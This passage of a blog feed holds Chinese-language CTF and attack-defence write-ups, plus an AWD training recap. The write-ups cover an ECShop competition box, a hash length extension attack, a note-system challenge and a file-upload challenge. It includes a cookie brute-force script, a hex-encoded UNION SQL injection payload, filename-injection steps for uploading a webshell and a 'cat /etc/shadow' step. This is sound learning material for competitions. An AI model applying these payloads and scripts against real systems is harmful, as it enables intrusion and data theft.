title="漏洞复现："></a>漏洞复现：</h1><p>通过浏览器访问环境URL，利用burpsuite对数据包进行拦截，修改数据包发送方式并且插入POST数据<br><strong>{“name”:”feifei”,age:12}</strong> ，查看效果：<br><img src="\images\pasted-59.png" alt="upload successful"><br>然后根据参考文献找到Test.java文件<br>构造poc(<strong><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">反弹shell</a></strong>)，编译一下<br><img src="\images\pasted-60.png" alt="upload successful"><br>生成.class文件<br><img src="\images\pasted-61.png" alt="upload successful"><br>base64 encode一下<br><img src="\images\pasted-62.png" alt="upload successful"><br>替换name字段，post过去<br><img src="\images\pasted-63.png" alt="upload successful"><br>可以看到命令执行成功<br><img src="\images\pasted-64.png" alt="upload successful"><br>nc连接上执行命令<br><img src="\images\pasted-65.png" alt="upload successful"><br>然后就是执行主办方给的getflag命令就可以打了，当时不知道什么原因环境命令执行有时能成功有时不成功≡￣﹏￣≡<br>nc也死活连不上<br>说到底还是自己好菜，对基础的东西理解还是不扎实，还是要多总结多刷题以赛代练，希望自己能进步的快一点　&lt;(￣ c￣)y▂ξ</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> AWD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第三届安恒杯线下赛总结</title>
      <link href="/2018/06/26/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%AE%89%E6%81%92%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93-1/"/>
      <url>/2018/06/26/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%AE%89%E6%81%92%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93-1/</url>
      <content type="html"><![CDATA[<p>&emsp;&emsp;这次比赛只有一道web环境，用的是ECShop V2.7.3<br><br>&emsp;&emsp;模式是AD攻防，规则很简单（虽然半天才搞明白 ￣﹏￣），让对方的极其请求<a href="http://10.0.1.2，并带上自己的token，即可获取flag" target="_blank" rel="noopener">http://10.0.1.2，并带上自己的token，即可获取flag</a>  <br><br></p><h1 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h1><p><strong>post方式</strong><br>文件url：<a href="http://10.50.%s.2/mobile/index.php" target="_blank" rel="noopener">http://10.50.%s.2/mobile/index.php</a><br>参数：url=<a href="http://10.0.1.2?token=RCNWBJXQ" target="_blank" rel="noopener">http://10.0.1.2?token=RCNWBJXQ</a><br><br></p><h1 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h1><p><strong>post方式</strong><br>文件url：<a href="http://10.50.33.2/mobile/index.php?m=default&amp;c=auction" target="_blank" rel="noopener">http://10.50.33.2/mobile/index.php?m=default&amp;c=auction</a><br>参数：1=phpinfo()<br><br></p><p><strong>提示线索1:</strong><br>mobile/themes/default/auction_list.dwt<br>这是一个预留后门，比较叼D盾扫不出来<br><strong>提示线索2:</strong><br>mobile/api/uc.php<br><br></p><h1 id="任意文件读取-poc-1"><a href="#任意文件读取-poc-1" class="headerlink" title="任意文件读取(poc 1)"></a>任意文件读取(poc 1)</h1><p>根据给出的poc1，我们快速去定位问题文件位置<br>我们从mobile入口文件入手<br>即：  mobile/index.php<br>查看内容<br><img src="\images\pasted-36.png" alt="upload successful"><br>跟踪文件 <img src="\images\pasted-37.png" alt="upload successful"><br>看到内容 <img src="\images\pasted-38.png" alt="upload successful"><br>跟踪apps/目录<br>可以发现3个文件夹 <img src="\images\pasted-39.png" alt="upload successful"><br>我们首先看到默认文件夹 <img src="\images\pasted-40.png" alt="upload successful"><br>此时又得到5个文件夹 <img src="\images\pasted-41.png" alt="upload successful"><br>从第一个common文件夹开始<br>可以看到insert.php中的一个函数 <img src="\images\pasted-42.png" alt="upload successful"><br>看到关键代码 <img src="\images\pasted-43.png" alt="upload successful"><br>其中 <img src="\images\pasted-44.png" alt="upload successful"><br>明显是一个任意文件读取<br>利用脚本： <img src="\images\pasted-45.png" alt="upload successful"><br><br><br></p><h1 id="一句话木马文件-poc-2"><a href="#一句话木马文件-poc-2" class="headerlink" title="一句话木马文件(poc 2)"></a>一句话木马文件(poc 2)</h1><p><strong>防守方法删除预留后门auction_list.dwt文件即可</strong><br>当时官方给出提示：auction_list.dwt文件!<br><a href="\images\pasted-46.png">upload successful</a><br>由于此文件用于渲染，直接将小马删除即可<br><br><br><br></p><h1 id="任意写文件"><a href="#任意写文件" class="headerlink" title="任意写文件"></a>任意写文件</h1><p><strong>防守方法改掉writesth函数名即可</strong><br>定位到mobile/api/uc.php<br>在action数组中发现了一些奇怪的东西<br><img src="\images\pasted-47.png" alt="upload successful"><br>最后一个writesth十分瞩目，一看就应该是主办方留下的功能，我们全局搜索这个writesth函数<br>不难发现以下关键代码：<br><img src="\images\pasted-48.png" alt="upload successful"><br>即：<br>文件名可控<br>文件内容可控<br>即可写入Webshell<br>我们测试<br><img src="\images\pasted-49.png" alt="upload successful"><br>运行即可发现我们当前目录下写入sky.php，内容为<img src="\images\pasted-50.png" alt="upload successful"><br>但是由于当时的环境里，只有data目录有可写全写，而我们默认路径为<br><img src="\images\pasted-51.png" alt="upload successful"><br>所以直接写可能无效，应该选择上跳，例如  ../data/sky.php<br><br><br><br></p><h1 id="ECShop-v2-7-3后台直接getshell"><a href="#ECShop-v2-7-3后台直接getshell" class="headerlink" title="ECShop v2.7.3后台直接getshell"></a><strong><a href="!http://www.haaker.cn/?p=6420">ECShop v2.7.3后台直接getshell</a></strong></h1><p><img src="\images\pasted-52.png" alt="upload successful"><br><img src="\images\pasted-53.png" alt="upload successful"><br><img src="\images\pasted-54.png" alt="upload successful"><br><img src="\images\pasted-55.png" alt="upload successful"><br>防守方法改掉后台密码即可（默认admin admin888）<br><br><br><br></p><h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>本次比赛还有一个漏洞就是ctf用户弱口令<br>cat /etc/shadow<br>得到ctf账户密码123456<br>就因为这个漏洞被dalao全场从头打到尾…</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> AWD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hash长度拓展攻击</title>
      <link href="/2018/05/08/hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2018/05/08/hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<h3 id="Hash-Length-Extension-Attack"><a href="#Hash-Length-Extension-Attack" class="headerlink" title="Hash Length Extension Attack"></a>Hash Length Extension Attack</h3><p>&emsp;&emsp;总体来说就是我们知道一个加盐的hash值，即使我们不知道盐的具体内容，但只要知道长度就可以随便伪造种带盐的hash（相当于我们控制了明密文）<br><br></p><h1 id="MD5加密原理"><a href="#MD5加密原理" class="headerlink" title="MD5加密原理"></a>MD5加密原理</h1><p>先介绍一下md5加密的原理<br><img src="\images\pasted-25.png" alt="upload successful"></p><p>个人理解: md5的过程可以分成<strong>填充</strong>和<strong>压缩</strong>的过程<br></p><ul><li>md5 padding(填充)<br>&emsp;&emsp;message padding<br>&emsp;&emsp;length%64=56(8位标识原始长度)<br>填充的时候，将会使用16进制数据：<br>&emsp;~1个\x80<br>&emsp;~N个\0x00      </li><li>md5 compress(压缩)<br>&emsp;&emsp;message padding length—–&gt;hash<br>&emsp;&emsp;length=N*64(bit)      —–&gt;length%64(bit)<br><br></li></ul><h2 id="md5-padding"><a href="#md5-padding" class="headerlink" title="md5 padding"></a>md5 padding</h2><p><em>例如我们把admin来hash一下:</em><br>admin  先hex编码-&gt;61646d696e<br>再填充80<br>不满64bit，填充到第56位（50个00）——为了保证信息的长度为N*64+56(字节)<br>最后数据表示位2800000000000000（8个字节）<br>最终结果为:</p><blockquote><p>61646d6968000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000<br><br></p></blockquote><p><strong>什么是Magic number (确定值)</strong><br>代码中的0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L这4个初始化的number就被称为Magic number或者是md5 iv (md5向量)<br><br><br></p><h2 id="md5-compress"><a href="#md5-compress" class="headerlink" title="md5 compress"></a>md5 compress</h2><p>我们发现，无论输入多长的信息，计算出来的问就按hash长度都是固定的(md5有32字节)，这就是因为hash算法是一种压缩算法。<br>Hash设计的时候不要求还原，所以就尽可能的扩大信息对每一位hash值的印象。在计算中，也是通过对每组长度为64bit信息分组进行迭代运算实现的。<br>每一次迭代，都会利用一个初始值与本组中的原始信息做一个复杂的数学运算，而将生成的结果带入到下次的复杂运算中作为初始值<br><br><br>我们还是计算admin的md5值。因为不满64bit,所以padding之后也只有64个bit，也就需要计算一轮compress压缩算法。压缩算法完成后产生的心magic number为：<br>A=0x292f2321L<br>B=0xa7a5577aL<br>C=0xe4a8943L<br>D=0xc31f804aL<br>而md5的结果:<br><img src="\images\pasted-26.png" alt="upload successful"><br>我们发现其实就是这一轮结果的简单拼接（小端存储数据倒叙）<br><br></p><h1 id="hash长度拓展攻击"><a href="#hash长度拓展攻击" class="headerlink" title="hash长度拓展攻击"></a>hash长度拓展攻击</h1><p>其实只要知道三点后就能进行攻击：</p><ul><li>MD5(salt+message)的值</li><li>message内容</li><li>salt+message长度<br>这样就可以在不知道salt的具体内容下，计算出任意的md5(salt+message+padding+append)值<br>因为salt+message+padding内容是经过填充的，一定是N*64，所以这个部分刚好能完成N轮复杂运算。而他的结果，也就是md5(salt+message+padding)刚好是用来做下一轮运算，也就是m’+padding运算的初始向量。<br><img src="\images\pasted-27.png" alt="upload successful"></li></ul><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>逆向算法很简单</p><pre><code>def compute_magic_number(self, md5str):    self.A = struct.unpack(&quot;I&quot;, md5str[0:8].decode(&apos;hex&apos;))[0]    self.B = struct.unpack(&quot;I&quot;, md5str[8:16].decode(&apos;hex&apos;))[0]    self.C = struct.unpack(&quot;I&quot;, md5str[16:24].decode(&apos;hex&apos;))[0]    self.D = struct.unpack(&quot;I&quot;, md5str[24:32].decode(&apos;hex&apos;))[0]</code></pre><p>由它逆出A=0x292f2321L,B=0xa7a5577aL,C=0xe4a8943L,D=0xc31f804aL<br>根据这4个Magci number，再和扩展的字符串m’(此时的m’要进行padding，padding的长度是len(salt+message+padding+m’))进行md5 compress，最后的结果即md5(salt+message+padding+m’)<br>这样就完成了长度拓展攻击</p><h2 id="例题测试"><a href="#例题测试" class="headerlink" title="例题测试"></a>例题测试</h2><h3 id="实验吧-让我进去"><a href="#实验吧-让我进去" class="headerlink" title="实验吧-让我进去"></a>实验吧-让我进去</h3><p>抓包改source，Repeater过去发现源码</p><pre><code>$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security      $username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) {    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {            echo &quot;Congratulations! You are a registered user.\n&quot;;            die (&quot;The flag is &quot;. $flag);        }        else {            die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);        }    }    else {        die (&quot;You are not an admin! LEAVE.&quot;);    }}setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) {setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else {    if ($_COOKIE[&quot;source&quot;] != 0) {        echo &quot;&quot;; // This source code is outputted here    }}</code></pre><p>按照源码要求，cookie中要存在变量getmein，而且，要 $COOKIE[“getmein”] === md5($secret . urldecode($username . $password))<br>sample-hash是secret+adminadmin的MD5<br><img src="\images\pasted-67.png" alt="upload successful"><br>这里secret相当于盐，我们并不知道，但是我们知道它的长度是15，算上后面admin就是20。<br>数据是admin<br>签名（哈希值）是571580b26c65f306376d4f64e53cb5c7<br><img src="\images\pasted-68.png" alt="upload successful"><br>生成的hash是新的签名，设置到cookies的getmein里面<br>把\x换成%后post提交，得到flag<br><img src="\images\pasted-69.png" alt="upload successful"></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>蓝鲸笔记系统writeup</title>
      <link href="/2018/04/10/%E8%93%9D%E9%B2%B8%E7%AC%94%E8%AE%B0%E7%B3%BB%E7%BB%9Fwriteup/"/>
      <url>/2018/04/10/%E8%93%9D%E9%B2%B8%E7%AC%94%E8%AE%B0%E7%B3%BB%E7%BB%9Fwriteup/</url>
      <content type="html"><![CDATA[<h4 id="蓝鲸笔记系统"><a href="#蓝鲸笔记系统" class="headerlink" title="蓝鲸笔记系统"></a>蓝鲸笔记系统</h4><p>给出一个login界面，url看上去似乎有问题<br><br><a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login</a><br><br>感觉像是有文件包含<br><br>随便尝试一下<a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=index" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=index</a><br><br><img src="\images\pasted-0.png" alt="upload successful"><br>果然是文件包含。先随便注册一个账号进去看看，发现 hint:./dbinit.sql</p><p><img src="\images\pasted-4.png" alt="upload successful"><br>发现了flag字段，flag应该就是在数据库里面了</p><p>肯定是文件包含无疑了，相办法读源码</p><h5 id="利用php伪协议读源码："><a href="#利用php伪协议读源码：" class="headerlink" title="利用php伪协议读源码："></a>利用php伪协议读源码：</h5><p>php://filter/read=convert.base64-encode/resource=<br><img src="\images\pasted-5.png" alt="upload successful"><br>不让读，真尴尬</p><p>然后仔细看了看url，猜测这个front是文件夹名，login是文件名<br><a href="http://202.98.28.108:10013/7sghfe673jd3/front/index.php" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/front/index.php</a><br><img src="\images\pasted-6.png" alt="upload successful"><br><img src="\images\pasted-7.png" alt="upload successful"><br>还是拒绝访问…</p><p>猜测后台脚本是这样写的:<br><br>include($action.’/‘.$mode.’.php’)<br><br>require”$action.’/‘.$mode.’.php’”</p><p><img src="\images\pasted-8.png" alt="upload successful"><br>成功读出来了！！！<br><br>login不让读，但是审计index.php的源码时发现common.php，顺便把源码也down下来</p><h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><p>先看一下index.php，并没有发现什么东西<br>在common.php中发现一些定义的函数</p><p>御剑扫一下，发现/admin/login.php , /admin/index.php，把源码都down下来<br><br>在/admin/login.php中发现<br><img src="\images\pasted-9.png" alt="upload successful"></p><p>/admin/login.php,调用了set_login()函数</p><p><img src="\images\pasted-10.png" alt="upload successful"></p><p>/front/common.php中有set_login()函数的定义</p><p><img src="\images\pasted-11.png" alt="upload successful"></p><p><img src="\images\pasted-12.png" alt="upload successful"></p><p><img src="\images\pasted-13.png" alt="upload successful"></p><p><img src="\images\pasted-14.png" alt="upload successful"></p><p>来到<a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login</a></p><p><img src="\images\pasted-15.png" alt="upload successful"><br>跟踪一下这几个函数，这里设置了cookies和session。可以看出来最后set_cookie的值是$uname|$endata<br>$uname是admin。则cookie是 admin|md5(SECURITY_KEY+admin) <br><br>SECURITY_KEY 是个随机数，每一位是从wh两个字母中随机出来的6位随机数</p><p>看一下后台登陆验证</p><p><img src="\images\pasted-16.png" alt="upload successful"><br>两个函数在common.php中</p><p><img src="\images\pasted-17.png" alt="upload successful"></p><p><img src="\images\pasted-18.png" alt="upload successful"><br>这里验证了userid和level，如果cookie验证失败，则返回false，level如果是0，也返回false。</p><p>但是如果我们没有登陆，直接来到/admin/index.php页面，而且绕过cookie的验证，那么userid和level的默认初始值都是null。在php中，<br>null!==False</p><blockquote><blockquote><p>True<br>null!=False<br>False<br>$null!==false是返回true的。所以只要我们能伪造cookie，就可以绕过验证。</p></blockquote></blockquote><h5 id="爆破cookie脚本"><a href="#爆破cookie脚本" class="headerlink" title="爆破cookie脚本"></a>爆破cookie脚本</h5><pre><code>import requestsimport hashlibimport randomimport stringfalse_tag = &quot;not login!&quot;url = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=index&quot;url_csrf = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login&quot;def rand_str(length):    return &apos;&apos;.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))def md5_encode(data):    hash = hashlib.md5()    hash.update((data + &quot;admin&quot;).encode())    return hash.hexdigest()key = []for x1 in [&quot;w&quot;,&quot;h&quot;]:    for x2 in [&quot;w&quot;,&quot;h&quot;]:        for x3 in [&quot;w&quot;,&quot;h&quot;]:            for x4 in [&quot;w&quot;,&quot;h&quot;]:                for x5 in [&quot;w&quot;,&quot;h&quot;]:                    for x6 in [&quot;w&quot;,&quot;h&quot;]:                        key.append(x1+x2+x3+x4+x5+x6)                        print keys = requests.Session()    s.headers = {        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&apos;,        &apos;cookie&apos;: &apos;&apos;    }for x in key:       s.headers[&quot;cookie&quot;] = &quot;uid=admin%7C&quot;+md5_encode(x)#+&quot;;&quot;+&quot;PHPSESSID={}&quot;.format(rand_str(26))    s.headers[&quot;PHPSESSID&quot;] = rand_str(26)    print s.headers[&quot;cookie&quot;]    result = s.get(url)    #print result.content    if false_tag in result.content:        print &quot;NO&quot;,x    else:        print &quot;YES&quot;        print s.headers        print result.content        break</code></pre><p><img src="\images\pasted-19.png" alt="upload successful"></p><p>发现setpagenumu页面，down下来源码</p><p><img src="\images\pasted-20.png" alt="upload successful"></p><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>发现post的page是用户可以输入<br>但是类型限制了纯数字，应该是没有办法注入</p><p>回去审计/admin/index.php</p><p><img src="\images\pasted-21.png" alt="upload successful"><br>发现数据库里查询的是$page_size,跟踪get_page_size(),</p><p><img src="\images\pasted-22.png" alt="upload successful"><br>get_page_size()函数返回num，也就是index里面的$page_size<br>感觉应该能注入，回去看数据库文件</p><p><img src="\images\pasted-23.png" alt="upload successful"><br>发现数据库里定义的page是varchar类型<br>标准的脚本代码与数据库类型不匹配<br>利用is_numeric()函数的漏洞(认为0x…是整数)，构造一个二次注入</p><p>数据库文件中可以看到一共有四个列</p><p><img src="\images\pasted-24.png" alt="upload successful"><br>构造注入语句<br>2 union select 1,flag,flag,4 from flags<br>转成十六进制注入即可拿到flag<br>0x3220756e696f6e2073656c65637420312c666c61672c666c61672c342066726f6d20666c616773</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 二次注入 </tag>
            
            <tag> php函数漏洞 </tag>
            
            <tag> php伪协议 </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件管理系统writeup</title>
      <link href="/2018/04/08/day1%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2018/04/08/day1%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      <content type="html"><![CDATA[<h3 id="文件上传之代码审计"><a href="#文件上传之代码审计" class="headerlink" title="文件上传之代码审计"></a>文件上传之代码审计</h3><p>前几天做了一道有趣的web题，涉及到文件上传，代码审计，二次注入。</p><p>首先是一个文件管理系统，上传文件，重命名文件，删除文件的功能。也给出了网站源码。<img src="\images\pasted-1.png" alt="upload successful"><br>先审计代码，看一下upload.php<br><img src="\images\pasted-2.png" alt="upload successful"><br>文件上传函数，先看服务器怎么检查文件的，可以看到$pat_part[“extension”]不允许php上传<br>其中文件名 也被addslashes函数过滤，转义了一些字符，因此这里应该不存在注入</p><p>文件名存在数据库两个字段中，一个是filename（文件名），一个是extension（后缀名）</p><p>可以看出来文件名走过的流程是：<br>$file[‘name’]—&gt;pathinfo()—&gt;$path_part[‘filename’]—&gt;addslashes()—&gt;insert</p><p>再看一下rename.php<br><img src="\images\pasted-3.png" alt="upload successful"><br>首先查询文件名，如果存在，执行sql语句<br>根据$req[‘filename’]从数据库里查询到已存在的一行，并调用update语句进行修改</p><p>但在这里{oldname=[‘filename’]}将从数据库里查出的$result[‘filename’]再一次入库，结果造成一个二次注入</p><p>如果我们可以插入让extension的值为空，再把文件名在改名为.php就可以解析了</p><p>那么思路很明确，我们上传一个有恶意字段的jpg文件，然后rename进数据库，让后缀名变为空，然后再上传一个木马文件，由于extension为空，所以再次修改的时候不会加上.jpg的扩展名。</p><h5 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h5><blockquote><ul><li>上传文件名为’,extension=’’,filename=’aa.jpg.jpg</li><li>这样filename的值为’,extension=’’,filename=’aa.jpg</li><li>我们重命名把’,extension=’’,filename=’aa.jpg改为aa.jpg</li><li>这时我们再次上传一个写有木马的文件，文件名为aa.jpg</li><li>此时不会提示file is exists 因为extension!=jpg</li><li>将aa.jpg改为aa.php即可</li></ul></blockquote>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 二次注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/04/07/hello-world/"/>
      <url>/2018/04/07/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>RSA总结</title>
      <link href="/2018/04/06/rsa%E6%80%BB%E7%BB%93/"/>
      <url>/2018/04/06/rsa%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>先留个坑，等强网杯RSA那道题出write up再写…</p>]]></content>
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
            <tag> rsa </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第一次攻防训练赛小记</title>
      <link href="/2018/04/01/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E8%AE%AD%E7%BB%83%E8%B5%9B%E5%B0%8F%E8%AE%B0/"/>
      <url>/2018/04/01/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E8%AE%AD%E7%BB%83%E8%B5%9B%E5%B0%8F%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>&emsp;&emsp;昨天按照实验室的要求，我们参加了个人的第一场ctf攻防形式的训练赛。形式是线上赛，由师傅搭好的环境，总体来说收获还是很大的，见识到了很多有(yin)趣(xian)的套路。总结一下<br><br><br>&emsp;&emsp;先说一下规则，一个五个队伍，每队两人。因为是训练，只有三道Web题，拿到其他队的flag加十分，被攻击队伍扣除相应分数。重启服务器扣除300分。五分钟一回合，宕机一回合扣除 (未宕机队伍的数量)*3 ，分数平均加到相应的队伍。（过程中发现一个骚操作就是当其他队伍宕机了，你还可以用之前上的shell拿flag，这样相当于多加了一部分分数）<br><br></p><blockquote><ul><li>第一道题是semcms1.1版本，上网查到<a href="http://0day5.com/archives/4320/" target="_blank" rel="noopener">相应漏洞</a>，首先注入找到后台密码，后台有个任意文件上传，上一张图片马直接getshell，连菜刀顺利拿到flag。但是大佬们更快一步，已经吊打我们而且把洞修好了…</li></ul></blockquote><blockquote><ul><li>第三题是一个微窗cms，有一个<a href="http://0day5.com/archives/3996/" target="_blank" rel="noopener">命令执行的洞</a>。稍微有一点点麻烦，这个好像没法上shell，直接构造命令执行语句也能读出flag</li></ul></blockquote><blockquote><ul><li>第二题最骚，页面发现一个神奇md5，解密后发现是ranzhi，搜了一些poc都用不了，最后也没做出来。最后师傅们分享write up后发现website源码里有一个预留后门，直接菜刀拿shell！！！(hao qi ya)<br>正规解法是mysql查询到登录密码，登陆进去有一个上shell的地方。本菜代码审计能力太差，也没看懂</li></ul></blockquote><p><br>这次比赛下来身为小白总结了几点：<br>&emsp;&emsp;对于一个攻防比赛，最开始并不是攻击，也不是防御。二话不说ssh连上自己website把源码备份一遍。这样以来，如果以后不慎自己服务器宕机了，还有复原的机会。<br><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击方面：</span><br><span class="line">    拿到一个Web，黑盒找漏洞就比较简单，上网搜对应的资料。</span><br><span class="line">    白盒的话就是代码审计，打包下载到本地，利用代码审计工具Seay快速审计。</span><br><span class="line">    还有就是看看对数据库的操作有没有限制，这次就是出题人对mysql并没有任何限制，也就是说很多东西我们直接可以从数据库里找。还有就是看一下有没有出题人留得后门。</span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">防御方面：</span><br><span class="line">首先猜测防御规则， 不要再防守的时候吧自己服务器给干掉了。</span><br><span class="line">    通用防御：上waf，直接吧不想要的请求比如<span class="built_in">post</span>，<span class="built_in">get</span>全部给禁掉等等；</span><br><span class="line">    设置目录权限，例如上传目录权限给死。</span><br><span class="line">    最后一个也是最耗时间的，就是代码审计，找到漏洞存在的位置，修改代码。</span><br></pre></td></tr></table></figure><p><br>&emsp;&emsp;比赛结束后的交流也见识到了一些骚套路，比如什么不死马，利用虚拟机做蜜罐专偷其他队伍shell什么的，zhang见识了，具体的操作有空再研究。奋斗ing…<br><br><br><br></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> AWD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件上传常规漏洞总结</title>
      <link href="/2018/04/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2018/04/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
